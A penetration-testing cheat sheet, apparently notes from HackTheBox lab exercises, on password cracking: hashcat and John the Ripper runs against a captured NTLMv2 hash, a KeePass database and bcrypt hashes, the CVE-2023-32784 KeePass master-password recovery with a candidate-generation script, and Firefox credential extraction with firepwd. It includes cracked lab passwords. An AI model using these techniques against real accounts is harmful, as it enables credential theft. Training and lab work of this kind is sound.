# Password attacks & Cracking

## NTLM password cracking
- `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt`
- we got some hash with LLMNR poisoning via responder
```
[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
[SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:d865666f39a9b532:01D7E2F5B84A3C82CE68D2811DCC234F:0101000000000000003C496FDF67DB013C531659E96BE0D90000000002000800580059003900540001001E00570049004E002D0054004500480059004E0058004B003300520042004C0004003400570049004E002D0054004500480059004E0058004B003300520042004C002E0058005900390054002E004C004F00430041004C000300140058005900390054002E004C004F00430041004C000500140058005900390054002E004C004F00430041004C0007000800003C496FDF67DB01060004000200000008003000300000000000000000000000003000007C27B08691713C851858FE2726C5AC6C4AC39403080EEDB1CE01D156FCE98E3C0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
```
- save `backupagent::INLANEFREIGHT:d865666f39a9b532:01D7E2F5B84A3C82CE68D2811DCC234F:0101000000000000003C496FDF67DB013C531659E96BE0D90000000002000800580059003900540001001E00570049004E002D0054004500480059004E0058004B003300520042004C0004003400570049004E002D0054004500480059004E0058004B003300520042004C002E0058005900390054002E004C004F00430041004C000300140058005900390054002E004C004F00430041004C000500140058005900390054002E004C004F00430041004C0007000800003C496FDF67DB01060004000200000008003000300000000000000000000000003000007C27B08691713C851858FE2726C5AC6C4AC39403080EEDB1CE01D156FCE98E3C0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000` in a txt.
- and now run: `.\hashcat.exe -m 5600 -a 0 .\ntlmv2.txt .\rockyou.txt`
- `-m 5600` especifica que es NTLMv2.
`-a 0` indica un ataque de diccionario.
`hashes.txt` es el archivo con el hash NTLMv2.
- `rockyou.txt` es el diccionario de contraseñas.

### Example output:
```
PS C:\Users\Grunt\Desktop\hashcat-6.2.6> .\hashcat.exe -m 5600 -a 0 .\ntlmv2.txt .\rockyou.txt
hashcat (v6.2.6) starting

hiprtcCompileProgram is missing from HIPRTC shared library.

OpenCL API (OpenCL 2.1 AMD-APP (3628.0)) - Platform #1 [Advanced Micro Devices, Inc.]
=====================================================================================
* Device #1: AMD Radeon RX 6600, 8064/8176 MB (6732 MB allocatable), 14MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 245 MB

Dictionary cache hit:
* Filename..: .\rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

BACKUPAGENT::INLANEFREIGHT:d865666f39a9b532:01d7e2f5b84a3c82ce68d2811dcc234f:0101000000000000003c496fdf67db013c531659e96be0d90000000                                                                                                           0002000800580059003900540001001e00570049004e002d0054004500480059004e0058004b003300520042004c0004003400570049004e002d00540045004800590                                                                                                           004e0058004b003300520042004c002e0058005900390054002e004c004f00430041004c000300140058005900390054002e004c004f00430041004c0005001400580                                                                                                           005900390054002e004c004f00430041004c0007000800003c496fdf67db01060004000200000008003000300000000000000000000000003000007c27b08691713c8                                                                                                           851858fe2726c5ac6c4ac39403080eedb1ce01d156fce98e3c0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e0                                                                                                           00310036002e0035002e003200320035000000000000000000:h1backup55

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: BACKUPAGENT::INLANEFREIGHT:d865666f39a9b532:01d7e2f...000000
Time.Started.....: Thu Jan 16 08:34:36 2025 (1 sec)
Time.Estimated...: Thu Jan 16 08:34:37 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (.\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 13202.6 kH/s (5.06ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8257536/14344384 (57.57%)
Rejected.........: 0/8257536 (0.00%)
Restore.Point....: 7340032/14344384 (51.17%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: ina&alessandro -> estampida02
Hardware.Mon.#1..: Temp: 54c Fan: 36% Util: 26% Core:1408MHz Mem:1742MHz Bus:8

Started: Thu Jan 16 08:34:22 2025
Stopped: Thu Jan 16 08:34:38 2025
PS C:\Users\Grunt\Desktop\hashcat-6.2.6>
```

## Crack keepass database

```
┌──(kali㉿kali)-[~/Desktop/boxes/Keeper]
└─$ ls
passcodes.kdbx  req.txt
                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/boxes/Keeper]
└─$ keepass2john passcodes.kdbx > keephash.txt
                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/boxes/Keeper]
└─$ ls
keephash.txt  passcodes.kdbx  req.txt
```

- Ahora con hashcat: `hashcat -m 13400 keephash.txt /usr/share/wordlists/rockyou.txt`
- o con john: `john --wordlist=/usr/share/wordlists/rockyou.txt keephash.txt`


#### KEEPASS CVE-2023-32784
- La vulnerabilidad CVE-2023-32784 es una falla en KeePass que permite recuperar la contraseña maestra de la memoria. Esta vulnerabilidad afecta a KeePass 2.x, y no requiere la ejecución de código en el sistema objetivo. La contraseña se puede recuperar desde un volcado de memoria del proceso, archivo de intercambio, archivo de hibernación, varios volcados de crash o un volcado de RAM del sistema completo.
- Hay que instalar dotnet

```bash
# Agregar el repositorio de Microsoft
wget https://packages.microsoft.com/config/debian/11/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb

# Instalar el SDK de .NET 7.0
sudo apt-get update
sudo apt-get install -y dotnet-sdk-7.0
```

- Luego hay que instalar [KeePassPasswordDumper](https://github.com/vdohney/keepass-password-dumper)
- `dotnet run /ruta/al/.dmp`
- Luego algun que otro caracter va a quedar mal, pero se puede iterar sobre este caracter con python.
    - recomiendo utilizar itertools + un string con los caracteres que se quieren probar. 

```python

import itertools
import sys

def generate_combinations(pattern, unknown_chars, output_file):
    # Lista de caracteres posibles para cada posición de la contraseña
    positions = []
    for char in pattern:
        if char == "●":
            positions.append(unknown_chars)
        else:
            positions.append(char)

    # Generar todas las combinaciones posibles
    with open(output_file, "w") as f:
        for combination in itertools.product(*positions):
            f.write(''.join(combination) + "\n")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Uso: python3 generate_passwords_param.py <pattern> <unknown_chars> <output_file>")
        sys.exit(1)
    
    pattern = sys.argv[1]
    unknown_chars = sys.argv[2]
    output_file = sys.argv[3]

    generate_combinations(pattern, unknown_chars, output_file)

``` 

- python3 generate_pass.py "●ødgrød med fløde" "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" "pass.txt"
- `hashcat -m 13400 keephash.txt pass.txt`
- `john --wordlist=pass.txt keephash.txt`


### About john the ripper
- The truth is that I don't give much importance to john the ripper, it is a very versatile tool but **the power of hashcat is beyond comparison**.


## bcrypt cracking commands
- `hashcat -m 3200 -a 0 hash.txt rockyou.txt`



## Firefox Password dumper
- Primero tenemos que ubicar si la maquina tiene firefox instalado, y si es así, tenemos que ubicar el perfil de firefox.
- Para esto recomiendo utilizar winpeas

``` 
  [+] Looking for Firefox DBs
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
 ```

 - Una vez que tenemos el perfil, tenemos que copiar la carpeta `br53rxeg.default-release` a nuestra máquina. 
 - Podemos utilizar [firepwd](https://github.com/lclevy/firepwd) para extraer las contraseñas.

 ```bash
 ┌──(kali㉿kali)-[~/firepwd]
└─$ python3 firepwd.py
<SNIP>
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
``` 